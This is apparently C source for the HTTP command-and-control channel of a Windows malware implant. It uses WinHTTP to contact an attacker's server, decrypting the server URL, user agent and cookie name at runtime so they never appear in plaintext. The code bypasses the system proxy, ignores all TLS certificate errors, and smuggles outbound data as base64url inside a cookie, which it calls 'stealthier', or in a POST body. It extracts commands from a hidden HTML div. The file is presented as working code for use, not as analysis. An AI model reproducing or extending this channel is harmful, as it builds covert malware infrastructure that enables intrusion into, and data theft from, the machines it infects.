/*
 * channel.c — HTTP channel via WinHTTP.
 * Sends C2 data as base64url in a cookie (per malleable profile).
 * Receives response as base64 in an HTML wrapper.
 */
#include "agent.h"

static HINTERNET g_hSession = NULL;

BOOL http_init(void) {
    g_hSession = WinHttpOpen(
        L"" /* User-Agent set per-request */,
        WINHTTP_ACCESS_TYPE_NO_PROXY,   /* Direct connection — bypass system proxy */
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!g_hSession) return FALSE;

    /*
     * Force TLS 1.2 only.  WinHTTP + Schannel TLS 1.3 has known handshake
     * interop issues with OpenSSL servers (renegotiation, ALPN mismatch,
     * post-handshake auth).  TLS 1.2 is universally supported.
     *
     * MUST be set on the session handle BEFORE any WinHttpConnect calls.
     */
    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    if (!WinHttpSetOption(g_hSession, WINHTTP_OPTION_SECURE_PROTOCOLS,
                          &protocols, sizeof(protocols))) {
        DBG("[http] WARNING: WinHttpSetOption(SECURE_PROTOCOLS) failed err=%u",
            GetLastError());
    } else {
        DBG("[http] forced TLS 1.2 only (protocols=0x%08X)", protocols);
    }

    /*
     * Disable HTTP/2 ALPN negotiation.  When WinHTTP sends h2 in the ALPN
     * extension but the server doesn't support it properly, the TLS
     * handshake can stall.  Force HTTP/1.1 only.
     */
    DWORD http_proto = 0;  /* 0 = HTTP/1.1 only, no HTTP/2 */
    WinHttpSetOption(g_hSession, WINHTTP_OPTION_ENABLE_HTTP_PROTOCOL,
                     &http_proto, sizeof(http_proto));
    DBG("[http] HTTP/2 ALPN disabled (HTTP/1.1 only)");

    /*
     * Set explicit timeouts to prevent indefinite blocking.
     * NOTE: these do NOT cover the Schannel TLS handshake — that's handled
     * by the send_request_with_timeout() wrapper below.
     * Args: hSession, DNS resolve ms, connect ms, send ms, receive ms
     */
    WinHttpSetTimeouts(g_hSession,
        5000,   /* DNS resolve: 5 seconds  */
        10000,  /* Connect:     10 seconds */
        15000,  /* Send:        15 seconds */
        15000   /* Receive:     15 seconds */
    );

    return TRUE;
}

void http_cleanup(void) {
    if (g_hSession) {
        WinHttpCloseHandle(g_hSession);
        g_hSession = NULL;
    }
}

/* Convert narrow string to wide string (caller frees) */
static wchar_t *to_wide(const char *s) {
    int len = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    wchar_t *w = (wchar_t *)malloc(len * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, s, -1, w, len);
    return w;
}

/* ─── Timer-based WinHttpSendRequest with hard timeout ───
 *
 * WinHTTP's session/request-level timeouts do NOT cover the Schannel TLS
 * handshake.  WinHttpSendRequest can block indefinitely during the TLS
 * negotiation even with all timeout options set.
 *
 * Fix: arm a timer-queue timer that closes the request handle after a
 * deadline.  Closing the handle from the timer callback cancels the
 * pending WinHttpSendRequest (MSDN-guaranteed).  Uses Windows thread
 * pool internally — no explicit CreateThread needed.
 *
 * Race safety: the request handle is stored in a struct accessed via
 * InterlockedExchangePointer.  Whichever side (timer callback or caller)
 * atomically swaps it to NULL first "owns" the handle decision — the
 * other sees NULL and does nothing.
 */
typedef struct {
    volatile HINTERNET hRequest;
} TimeoutCtx;

static VOID CALLBACK _send_timeout_cb(PVOID lpParam, BOOLEAN TimerOrWaitFired) {
    if (!TimerOrWaitFired || !lpParam) return;
    TimeoutCtx *ctx = (TimeoutCtx *)lpParam;
    /* Atomically take the handle — if non-NULL, we own and close it */
    HINTERNET h = (HINTERNET)InterlockedExchangePointer(
        (volatile PVOID *)&ctx->hRequest, NULL);
    if (h) {
        WinHttpCloseHandle(h);
    }
}

/*
 * Wrapper around WinHttpSendRequest that enforces a hard timeout.
 *
 * On timeout: the timer callback closes the handle, WinHttpSendRequest
 * unblocks with an error.  We set *phRequest = NULL so the caller
 * knows not to double-close.  Returns FALSE.
 */
static BOOL send_request_with_timeout(
    HINTERNET *phRequest,
    LPCWSTR   pwszHeaders,  DWORD dwHeadersLen,
    LPVOID    lpOptional,   DWORD dwOptionalLen,
    DWORD     dwTotalLength,
    DWORD     timeout_ms)
{
    /* Set up the timeout context */
    TimeoutCtx tctx;
    tctx.hRequest = *phRequest;

    HANDLE hTimer = NULL;
    BOOL timerOk = CreateTimerQueueTimer(
        &hTimer, NULL,
        _send_timeout_cb, &tctx,
        timeout_ms,       /* fire after timeout_ms */
        0,                /* period=0 → one-shot */
        WT_EXECUTEONLYONCE
    );

    if (!timerOk) {
        DWORD err = GetLastError();
        DBG("[http] CreateTimerQueueTimer failed err=%u (0x%08X) — no timeout protection",
            err, err);
        /* Fall through to sync call without timeout — better than nothing */
    }

    /* This may block — the timer will cancel it by closing the handle */
    BOOL result = WinHttpSendRequest(
        *phRequest, pwszHeaders, dwHeadersLen,
        lpOptional, dwOptionalLen, dwTotalLength, 0
    );
    DWORD sendError = result ? 0 : GetLastError();

    /* Atomically reclaim the handle. If NULL, the timer already closed it. */
    HINTERNET h = (HINTERNET)InterlockedExchangePointer(
        (volatile PVOID *)&tctx.hRequest, NULL);

    /* Delete the timer and wait for callback to finish (INVALID_HANDLE_VALUE
     * blocks until the callback has completed if it's currently running). */
    if (hTimer) {
        DeleteTimerQueueTimer(NULL, hTimer, INVALID_HANDLE_VALUE);
    }

    if (h == NULL) {
        /* Timer fired and closed the handle before we got here */
        DBG("[http] WinHttpSendRequest TIMED OUT after %u ms", timeout_ms);
        *phRequest = NULL;
        SetLastError(12002);  /* ERROR_WINHTTP_TIMEOUT */
        return FALSE;
    }

    /* We reclaimed the handle — timer didn't fire (or was deleted in time) */
    if (!result)
        SetLastError(sendError);
    return result;
}

/* ─── Profile transforms ─── */

char *profile_encode_request(const unsigned char *packet, DWORD packet_len,
                             DWORD *cookie_len) {
    /* Base64URL encode the packet for cookie embedding */
    return base64url_encode(packet, packet_len, cookie_len);
}

unsigned char *profile_decode_response(const char *body, DWORD body_len,
                                       DWORD *out_len) {
    /*
     * Response format (from default profile):
     *   <html><body><div style="display:none">\n
     *   BASE64_DATA\n
     *   </div></body></html>\n
     *
     * Find the base64 data between the wrappers.
     */
    const char *start = strstr(body, "display:none\">");
    if (!start) {
        /* Fallback: try to find base64 directly */
        start = body;
    } else {
        start += strlen("display:none\">");
        /* Skip whitespace/newlines */
        while (*start == '\n' || *start == '\r' || *start == ' ') start++;
    }

    const char *end = strstr(start, "</div>");
    if (!end) end = body + body_len;

    /* Trim trailing whitespace */
    while (end > start && (end[-1] == '\n' || end[-1] == '\r' || end[-1] == ' '))
        end--;

    DWORD b64_len = (DWORD)(end - start);
    if (b64_len == 0) {
        *out_len = 0;
        return NULL;
    }

    return base64_decode(start, b64_len, out_len);
}

/* ─── HTTP send/receive ─── */

BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
                    unsigned char **response, DWORD *response_len) {
    *response = NULL;
    *response_len = 0;

    if (!g_hSession) return FALSE;

    /* Decrypt C2 URL at runtime (never stored as plaintext in binary) */
    char c2_url_dec[512];
    DECRYPT_CONFIG(c2_url_dec, C2_URL);
    wchar_t *wUrl = to_wide(c2_url_dec);
    SecureZeroMemory(c2_url_dec, sizeof(c2_url_dec));

    URL_COMPONENTS urlComp;
    memset(&urlComp, 0, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!WinHttpCrackUrl(wUrl, 0, 0, &urlComp)) {
        DBG("[http] WinHttpCrackUrl FAILED (err=%u)", GetLastError());
        free(wUrl);
        return FALSE;
    }

    /* Extract hostname */
    wchar_t hostname[256] = {0};
    wcsncpy(hostname, urlComp.lpszHostName, min(urlComp.dwHostNameLength, 255));

    /* Extract path */
    wchar_t path[512] = {0};
    if (urlComp.lpszUrlPath && urlComp.dwUrlPathLength > 0)
        wcsncpy(path, urlComp.lpszUrlPath, min(urlComp.dwUrlPathLength, 511));
    else
        wcscpy(path, L"/");

    BOOL isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);
    INTERNET_PORT port = urlComp.nPort;
    if (port == 0) port = isHttps ? 443 : 80;

    /* Connect */
    DBG("[http] connecting to %S:%u (https=%d)", hostname, port, isHttps);
    HINTERNET hConnect = WinHttpConnect(g_hSession, hostname, port, 0);
    if (!hConnect) {
        DWORD err = GetLastError();
        DBG("[http] WinHttpConnect FAILED (err=%u / 0x%08X)", err, err);
        free(wUrl);
        return FALSE;
    }

    /* Encode packet as base64url */
    DWORD b64_len;
    char *b64_val = profile_encode_request(packet, packet_len, &b64_len);
    if (!b64_val) {
        WinHttpCloseHandle(hConnect);
        free(wUrl);
        return FALSE;
    }

    /*
     * Decide transport: small payloads go in Cookie header (GET),
     * large payloads go in POST body to avoid header size limits.
     * Threshold: 8000 bytes of base64 (safe for most HTTP stacks).
     */
    BOOL use_post = (b64_len > 8000);
    const wchar_t *method = use_post ? L"POST" : L"GET";
    DBG("[http] payload b64_len=%u, using %s", b64_len, use_post ? "POST" : "GET+cookie");

    /* Open request */
    DBG("[http] opening request...");
    DWORD flags = isHttps ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, method, path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        DWORD err = GetLastError();
        DBG("[http] WinHttpOpenRequest FAILED (err=%u / 0x%08X)", err, err);
        WinHttpCloseHandle(hConnect);
        free(wUrl);
        free(b64_val);
        return FALSE;
    }
    DBG("[http] request handle opened OK");

    /* Accept self-signed certs (C2 server) */
    if (isHttps) {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                         &secFlags, sizeof(secFlags));
        DBG("[http] TLS sec flags set (ignore cert errors)");
    }

    /* Decrypt and set User-Agent header */
    char ua_dec[512];
    DECRYPT_CONFIG(ua_dec, USER_AGENT);
    char ua_header[768];
    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", ua_dec);
    SecureZeroMemory(ua_dec, sizeof(ua_dec));
    wchar_t *wUA = to_wide(ua_header);
    WinHttpAddRequestHeaders(hRequest, wUA, (DWORD)-1,
                             WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD);
    free(wUA);
    DBG("[http] headers set, about to send...");

    BOOL ok;
    if (use_post) {
        /* Large payload: send as POST body with Content-Type */
        WinHttpAddRequestHeaders(hRequest,
            L"Content-Type: application/octet-stream", (DWORD)-1,
            WINHTTP_ADDREQ_FLAG_ADD);
        DBG("[http] calling WinHttpSendRequest (POST, %u bytes)...", b64_len);
        ok = send_request_with_timeout(&hRequest,
                WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                (LPVOID)b64_val, b64_len, b64_len,
                15000);  /* 15s hard timeout */
    } else {
        /* Small payload: embed in Cookie header (stealthier) */
        char ck_name_dec[64];
        DECRYPT_CONFIG(ck_name_dec, COOKIE_NAME);
        /* Dynamic alloc for cookie header to avoid fixed buffer overflow */
        DWORD hdr_size = (DWORD)(strlen("Cookie: ") + strlen(ck_name_dec) + 1 + b64_len + 1);
        char *cookie_hdr = (char *)malloc(hdr_size);
        snprintf(cookie_hdr, hdr_size, "Cookie: %s=%s", ck_name_dec, b64_val);
        SecureZeroMemory(ck_name_dec, sizeof(ck_name_dec));
        wchar_t *wCookie = to_wide(cookie_hdr);
        WinHttpAddRequestHeaders(hRequest, wCookie, (DWORD)-1,
                                 WINHTTP_ADDREQ_FLAG_ADD);
        free(wCookie);
        free(cookie_hdr);

        DBG("[http] calling WinHttpSendRequest (GET+cookie)...");
        ok = send_request_with_timeout(&hRequest,
                WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                WINHTTP_NO_REQUEST_DATA, 0, 0,
                15000);  /* 15s hard timeout */
    }
    DBG("[http] WinHttpSendRequest returned ok=%d", ok);
    free(b64_val);

    if (!ok) {
        DWORD err = GetLastError();
        DBG("[http] WinHttpSendRequest FAILED (err=%u / 0x%08X)", err, err);
        /* Common errors:
         * 12002 = ERROR_WINHTTP_TIMEOUT (connect/send timeout or our hard timeout)
         * 12007 = ERROR_WINHTTP_NAME_NOT_RESOLVED (DNS failed)
         * 12017 = ERROR_WINHTTP_OPERATION_CANCELLED (handle closed by timeout thread)
         * 12029 = ERROR_WINHTTP_CANNOT_CONNECT (refused / unreachable)
         * 12175 = ERROR_WINHTTP_SECURE_FAILURE (TLS error)
         */
        goto cleanup;
    }

    /* Receive response */
    ok = WinHttpReceiveResponse(hRequest, NULL);
    if (!ok) {
        DWORD err = GetLastError();
        DBG("[http] WinHttpReceiveResponse FAILED (err=%u / 0x%08X)", err, err);
        goto cleanup;
    }

    /* Log HTTP status code */
    {
        DWORD statusCode = 0, statusSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize,
            WINHTTP_NO_HEADER_INDEX);
        DBG("[http] HTTP status = %u", statusCode);
    }

    /* Read response body */
    Buffer resp_buf;
    buf_init(&resp_buf, 4096);

    DWORD bytes_available, bytes_read;
    do {
        bytes_available = 0;
        WinHttpQueryDataAvailable(hRequest, &bytes_available);
        if (bytes_available == 0) break;

        unsigned char *chunk = (unsigned char *)malloc(bytes_available);
        if (WinHttpReadData(hRequest, chunk, bytes_available, &bytes_read)) {
            buf_append(&resp_buf, chunk, bytes_read);
        }
        free(chunk);
    } while (bytes_available > 0);

    DBG("[http] raw body len=%u", resp_buf.len);
    if (resp_buf.len > 0 && resp_buf.len < 512) {
        /* Log first chunk of body for debugging */
        char preview[256];
        DWORD plen = resp_buf.len < 255 ? resp_buf.len : 255;
        memcpy(preview, resp_buf.data, plen);
        preview[plen] = '\0';
        DBG("[http] body: %.200s", preview);
    }

    /* Decode response body (strip HTML wrapper, base64 decode) */
    if (resp_buf.len > 0) {
        /* Null-terminate for string operations */
        buf_append(&resp_buf, "\0", 1);
        *response = profile_decode_response((char *)resp_buf.data,
                                             resp_buf.len - 1, response_len);
    }

    buf_free(&resp_buf);
    ok = (*response != NULL && *response_len > 0);
    DBG("[http] response decoded: %u bytes (ok=%d)", *response_len, ok);

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    free(wUrl);
    return ok;
}
